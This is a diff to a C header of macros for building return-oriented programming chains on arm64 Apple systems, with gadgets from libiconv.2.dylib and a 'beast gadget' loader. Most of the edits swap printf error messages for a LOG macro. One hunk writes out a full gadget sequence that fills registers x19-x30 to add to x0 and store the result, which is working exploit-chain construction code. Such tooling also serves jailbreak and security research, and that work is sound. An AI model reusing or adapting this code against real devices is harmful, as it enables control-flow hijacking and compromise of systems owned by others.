@@ -45,7 +45,7 @@ typedef struct rop_var rop_var_t;
 #define ROP_SETUP(rop_chain_head) \
 	rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t)); \
 	rop_gadget_t * prev = NULL; \
-	if (curr_gadget == NULL) {printf("malloc w00t\n");exit(-1);} \
+	if (curr_gadget == NULL) {LOG("malloc w00t");exit(-1);} \
 	curr_gadget->next = NULL; \
 	curr_gadget->type = NONE; \
 	curr_gadget->comment = NULL; \
@@ -201,7 +201,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	int rop_var_arg_num = -1; \
 	rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t)); \
 	rop_gadget_t * prev = NULL; \
-	if (curr_gadget == NULL) {printf("malloc w00t\n");exit(-1);} \
+	if (curr_gadget == NULL) {LOG("malloc w00t");exit(-1);} \
 	curr_gadget->next = NULL; \
 	curr_gadget->type = NONE; \
 	curr_gadget->comment = NULL; \
@@ -236,7 +236,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	
 // assuming we get here with pc pointing to the loader part of our beast gadget
 #define CALL_FUNCTION(next_addr,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
-	if (rop_var_arg_num != 0 && rop_var_arg_num != -1) {printf("WRONG AMOUNT OF ARGS (line:%d)\n",__LINE__);exit(1);} \
+	if (rop_var_arg_num != 0 && rop_var_arg_num != -1) {LOG("WRONG AMOUNT OF ARGS (line:%d)",__LINE__);exit(1);} \
 	rop_var_arg_num = -1; \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
@@ -287,7 +287,7 @@ add_x0_gadget (from libiconv.2.dylib):
 #define DEFINE_ROP_VAR(varname,varsize,buf) \
 	if (curr_rop_var != NULL) { \
 		new_rop_var = malloc(sizeof(rop_var_t)); \
-		if (new_rop_var == NULL) {printf("malloc\n");exit(-1);} \
+		if (new_rop_var == NULL) {LOG("malloc");exit(-1);} \
 		curr_rop_var->next = new_rop_var; \
 	} \
 	new_rop_var->name = strdup(varname); \
@@ -389,7 +389,32 @@ add_x0_gadget (from libiconv.2.dylib):
 	ROP_VAR_ARG_HOW_MANY(2); \
 	ROP_VAR_ARG64(var1,6); \
 	ROP_VAR_ARG64(var2,7); \
-	CALL_FUNC_RET_SAVE_VAR(result,(offsets->add_x0_gadget), 0,0,0,0,0,0,0,0);
+	ADD_GADGET(); \
+	ADD_GADGET(); \
+	ADD_GADGET(); /* d9 */ \
+	ADD_GADGET(); /* d8 */ \
+	ADD_GADGET(); /* x28 */ \
+	ADD_GADGET(); /* x27 */ \
+	ADD_GADGET(); /* x26 */ \
+	ADD_GADGET(); /* x25 */ \
+	ADD_GADGET(); /* x24 */ \
+	ADD_GADGET(); /* x23 */ \
+	ADD_GADGET(); /* x22 */ \
+	ADD_GADGET(); /* x21 will get overwritten by the ROP_VAR_ARG64 call above */ \
+	ADD_GADGET(); /* x20 will get overwritten by the ROP_VAR_ARG64 call above */ \
+	ADD_GADGET(); /* x19 */ \
+	ADD_GADGET(); /* x29 */ \
+	ADD_CODE_GADGET((offsets)->add_x0_gadget); /* x30 */  \
+	ADD_GADGET(); /* x22 */ \
+	ADD_GADGET(); /* x21 */ \
+	ADD_GADGET(); /* x20 */ \
+	ADD_ROP_VAR_GADGET_W_OFFSET(result, (-(offsets)->str_x0_gadget_offset)); /* x19 */ \
+	ADD_GADGET(); /* x29 */ \
+	ADD_CODE_GADGET((offsets)->str_x0_gadget); /* x30 */  \
+	ADD_GADGET(); /* x20 */ \
+	ADD_GADGET(); /* x19 */ \
+	ADD_GADGET(); /* x29 */ \
+	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); // x30 
 
 #define ROP_VAR_ARG_HOW_MANY(howmany) \
 	rop_var_arg_num = howmany;
@@ -400,7 +425,7 @@ add_x0_gadget (from libiconv.2.dylib):
 // this is super dirty...
 // FIXME: there must be a better way to do this...
 #define ROP_VAR_ARG_W_OFFSET(name,nr,offset) \
-	if (rop_var_arg_num == -1) {printf("YOU NEED TO USE ROP_VAR_ARG_HOW_MANY BEFORE USING ROP_VAR_ARG_* (line:%d)\n",__LINE__);exit(1);} \
+	if (rop_var_arg_num == -1) {LOG("YOU NEED TO USE ROP_VAR_ARG_HOW_MANY BEFORE USING ROP_VAR_ARG_* (line:%d)",__LINE__);exit(1);} \
 	rop_var_arg_num--; \
 	ADD_COMMENT("rop var arg with offset"); \
 	rop_var_tmp_nr = nr; \
@@ -427,7 +452,7 @@ add_x0_gadget (from libiconv.2.dylib):
 
 // same as above but it doesn't copy the pointer but a uint64_t value
 #define ROP_VAR_ARG64_W_OFFSET(name,nr,offset) \
-	if (rop_var_arg_num == -1) {printf("YOU NEED TO USE ROP_VAR_ARG_HOW_MANY BEFORE USING ROP_VAR_ARG_* (line:%d)\n",__LINE__);exit(1);} \
+	if (rop_var_arg_num == -1) {LOG("YOU NEED TO USE ROP_VAR_ARG_HOW_MANY BEFORE USING ROP_VAR_ARG_* (line:%d)",__LINE__);exit(1);} \
 	rop_var_arg_num--; \
 	ADD_COMMENT("rop var arg 64"); \
 	rop_var_tmp_nr = nr; \
